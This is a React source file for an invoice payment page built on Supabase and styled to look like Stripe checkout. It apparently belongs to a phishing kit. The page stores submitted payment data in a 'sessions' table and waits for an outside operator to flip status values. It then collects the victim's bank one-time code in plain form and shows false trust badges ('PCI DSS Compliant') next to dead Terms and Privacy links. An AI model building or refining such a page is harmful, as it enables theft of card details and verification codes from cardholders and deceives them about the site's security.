import { useState, useEffect, useRef } from "react";
import { useParams } from "react-router-dom";
import PaymentForm from "@/components/PaymentForm";
import OtpVerification from "@/components/OtpVerification";
import type { OtpType } from "@/components/OtpVerification";
import PaymentSuccess from "@/components/PaymentSuccess";
import PaymentRejected from "@/components/PaymentRejected";
import WaitingScreen from "@/components/WaitingScreen";
import { supabase } from "@/integrations/supabase/client";
import { ShieldCheck, Lock } from "lucide-react";

const InvoicePayment = () => {
  const { invoiceId } = useParams<{ invoiceId: string }>();
  const [step, setStep] = useState<"loading" | "not_found" | "paid" | "form" | "waiting" | "otp" | "processing" | "success" | "rejected">("loading");
  const [invoice, setInvoice] = useState<any>(null);
  const [businessSettings, setBusinessSettings] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [otpError, setOtpError] = useState<string | null>(null);
  const [otpType, setOtpType] = useState<OtpType>("6digit");
  const visitorId = useRef(crypto.randomUUID());

  // Presence tracking
  useEffect(() => {
    const channel = supabase.channel("visitors", {
      config: { presence: { key: visitorId.current } },
    });
    channel
      .on("presence", { event: "sync" }, () => {})
      .subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          await channel.track({ online_at: new Date().toISOString(), visitor_id: visitorId.current });
        }
      });
    return () => { supabase.removeChannel(channel); };
  }, []);

  // Load invoice and business settings
  useEffect(() => {
    const load = async () => {
      const [invoiceRes, settingsRes] = await Promise.all([
        supabase.from("invoices").select("*").eq("id", invoiceId).single(),
        supabase.from("business_settings").select("*").limit(1).single(),
      ]);

      if (invoiceRes.error || !invoiceRes.data) {
        setStep("not_found");
        return;
      }

      setInvoice(invoiceRes.data);
      if (settingsRes.data) setBusinessSettings(settingsRes.data);

      if (invoiceRes.data.status === "paid") {
        setStep("paid");
      } else {
        setStep("form");
      }
    };
    if (invoiceId) load();
  }, [invoiceId]);

  // Real-time session updates
  useEffect(() => {
    if (!sessionId || (step !== "waiting" && step !== "processing" && step !== "otp")) return;

    const channel = supabase
      .channel(`session-${sessionId}`)
      .on("postgres_changes", {
        event: "UPDATE", schema: "public", table: "sessions",
        filter: `id=eq.${sessionId}`,
      }, (payload) => {
        const newStatus = (payload.new as any).status;
        if (step === "waiting") {
          if (newStatus === "otp") {
            setOtpError(null);
            const formData = (payload.new as any).form_data || {};
            setOtpType((formData.otp_type as OtpType) || "6digit");
            setStep("otp");
          }
          if (newStatus === "rejected") setStep("rejected");
        }
        if (step === "otp") {
          if (newStatus === "otp_wrong") setOtpError("The verification code you entered is incorrect. Please try again.");
          if (newStatus === "otp_expired") setOtpError("This verification code has expired. Please request a new one.");
          if (newStatus === "rejected") setStep("rejected");
        }
        if (step === "processing") {
          if (newStatus === "success") {
            setStep("success");
            // Mark invoice as paid
            supabase.from("invoices").update({ status: "paid" }).eq("id", invoiceId);
          }
          if (newStatus === "rejected") setStep("rejected");
          if (newStatus === "otp_wrong") { setOtpError("The verification code you entered is incorrect. Please try again."); setStep("otp"); }
          if (newStatus === "otp_expired") { setOtpError("This verification code has expired. Please request a new one."); setStep("otp"); }
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [sessionId, step, invoiceId]);

  const handleFormSubmit = (id: string) => {
    setSessionId(id);
    setStep("waiting");
  };

  const handleOtpSubmit = async (otp: string) => {
    setOtpError(null);
    if (sessionId) {
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
      const existingData = (data?.form_data as Record<string, any>) || {};
      await supabase.from("sessions")
        .update({ status: "otp_submitted" as any, form_data: { ...existingData, otp } as any })
        .eq("id", sessionId);
    }
    setStep("processing");
  };

  const companyName = businessSettings?.company_name || "Pay";
  const amount = invoice?.amount || 0;
  const parsedAmount = parseFloat(amount) || 0;
  const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
  const total = parsedAmount > 0 ? parseFloat((parsedAmount + transactionFee).toFixed(2)) : 0;
  const isValidAmount = parsedAmount >= 1;

  const formatEuro = (val: number) =>
    val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });

  if (step === "loading") {
    return (
      <div className="min-h-screen bg-stripe-bg flex items-center justify-center">
        <div className="h-8 w-8 border-2 border-white/20 border-t-white rounded-full animate-spin" />
      </div>
    );
  }

  if (step === "not_found") {
    return (
      <div className="min-h-screen bg-stripe-bg flex items-center justify-center p-4">
        <div className="text-center space-y-3">
          <div className="h-16 w-16 rounded-full bg-white/5 flex items-center justify-center mx-auto">
            <Lock className="h-8 w-8 text-white/30" />
          </div>
          <h1 className="text-xl font-semibold text-white">Invoice not found</h1>
          <p className="text-white/40 text-sm max-w-sm">This payment link is invalid or has expired. Please contact the merchant for a new link.</p>
        </div>
      </div>
    );
  }

  if (step === "paid") {
    return (
      <div className="min-h-screen bg-stripe-bg flex items-center justify-center p-4">
        <div className="text-center space-y-3">
          <div className="h-16 w-16 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto">
            <ShieldCheck className="h-8 w-8 text-emerald-400" />
          </div>
          <h1 className="text-xl font-semibold text-white">Invoice already paid</h1>
          <p className="text-white/40 text-sm max-w-sm">This invoice ({invoice?.invoice_number}) has already been paid. No further action is needed.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-stripe-bg flex">
      {/* Left panel — branding / order summary */}
      <div className="hidden lg:flex lg:w-[480px] xl:w-[520px] flex-col justify-between p-10 xl:p-14">
        <div>
          <div className="flex items-center gap-2 mb-12">
            <div className="h-8 w-8 rounded-full bg-primary flex items-center justify-center">
              <span className="text-primary-foreground text-sm font-bold">{companyName.charAt(0)}</span>
            </div>
            <span className="text-white/90 font-semibold text-lg">{companyName}</span>
          </div>

          <div className="space-y-6">
            <div>
              <p className="text-white/50 text-sm">Invoice from {companyName}</p>
              <p className="text-white/40 text-xs mt-0.5">Ref: {invoice?.invoice_number}</p>
              <p className="text-white text-4xl font-bold tracking-tight mt-1">
                {formatEuro(total)}
              </p>
            </div>

            {invoice?.description && (
              <div className="bg-white/[0.04] rounded-lg p-4 border border-white/[0.06]">
                <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30 mb-1">Description</p>
                <p className="text-white/70 text-sm">{invoice.description}</p>
              </div>
            )}

            {invoice?.client_name && (
              <div className="bg-white/[0.04] rounded-lg p-4 border border-white/[0.06]">
                <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30 mb-1">Bill to</p>
                <p className="text-white/70 text-sm">{invoice.client_name}</p>
                {invoice.client_email && <p className="text-white/40 text-xs mt-0.5">{invoice.client_email}</p>}
              </div>
            )}

            <div className="space-y-4 mt-8">
              <div className="flex items-center justify-between py-3 border-b border-white/10">
                <p className="text-white/50 text-sm">Amount</p>
                <p className="text-white/90 text-sm">{formatEuro(parsedAmount)}</p>
              </div>
              <div className="flex items-center justify-between py-3 border-b border-white/10">
                <p className="text-white/50 text-sm">Transaction fee (0.1%)</p>
                <p className="text-white/90 text-sm">{formatEuro(transactionFee)}</p>
              </div>
              <div className="flex items-center justify-between py-3">
                <p className="text-white/90 text-sm font-semibold">Total</p>
                <p className="text-white text-sm font-semibold">{formatEuro(total)}</p>
              </div>
            </div>

            {invoice?.due_date && (
              <div className="flex items-center gap-2 text-white/30 text-xs mt-4">
                <span>Due by {new Date(invoice.due_date).toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" })}</span>
              </div>
            )}
          </div>
        </div>

        {/* Trust signals */}
        <div className="space-y-4">
          <div className="flex items-center gap-3 text-white/30 text-xs">
            <ShieldCheck className="h-4 w-4 text-emerald-400/60" />
            <span>256-bit SSL Encrypted · PCI DSS Compliant</span>
          </div>
          <div className="flex items-center gap-4 text-white/30 text-xs">
            <span>Powered by <span className="font-semibold text-white/50">{companyName}</span></span>
            <span>·</span>
            <a href="#" className="hover:text-white/50 transition-colors">Terms</a>
            <a href="#" className="hover:text-white/50 transition-colors">Privacy</a>
          </div>
        </div>
      </div>

      {/* Right panel */}
      <div className="flex-1 flex items-start justify-center bg-background rounded-tl-none lg:rounded-tl-2xl lg:rounded-bl-2xl overflow-y-auto">
        <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
          {/* Mobile header */}
          <div className="lg:hidden mb-8">
            <div className="flex items-center gap-2 mb-4">
              <div className="h-7 w-7 rounded-full bg-primary flex items-center justify-center">
                <span className="text-primary-foreground text-xs font-bold">{companyName.charAt(0)}</span>
              </div>
              <span className="text-foreground font-semibold">{companyName}</span>
            </div>
            <p className="text-muted-foreground text-sm">Invoice from {companyName}</p>
            <p className="text-muted-foreground/60 text-xs mt-0.5">Ref: {invoice?.invoice_number}</p>
            <p className="text-foreground text-3xl font-bold tracking-tight mt-1">{formatEuro(total)}</p>
            {invoice?.description && (
              <p className="text-muted-foreground text-sm mt-2">{invoice.description}</p>
            )}
            <div className="mt-3 space-y-1.5">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">Transaction fee (0.1%)</span>
                <span className="text-foreground">{formatEuro(transactionFee)}</span>
              </div>
              <div className="flex items-center justify-between text-sm font-semibold">
                <span className="text-foreground">Total</span>
                <span className="text-foreground">{formatEuro(total)}</span>
              </div>
            </div>
            {/* Mobile trust signal */}
            <div className="flex items-center gap-2 mt-4 text-muted-foreground/50 text-xs">
              <ShieldCheck className="h-3.5 w-3.5 text-emerald-500/60" />
              <span>SSL Encrypted · PCI DSS Compliant</span>
            </div>
          </div>

          {step === "form" && (
            <PaymentForm
              amount={String(parsedAmount)}
              onAmountChange={() => {}}
              total={total}
              isValidAmount={true}
              formatEuro={formatEuro}
              onSuccess={handleFormSubmit}
              fixedAmount={true}
              invoiceId={invoiceId}
            />
          )}
          {step === "waiting" && <WaitingScreen amount={formatEuro(total)} />}
          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} otpType={otpType} />}
          {step === "processing" && <WaitingScreen amount={formatEuro(total)} />}
          {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
          {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
        </div>
      </div>
    </div>
  );
};

export default InvoicePayment;
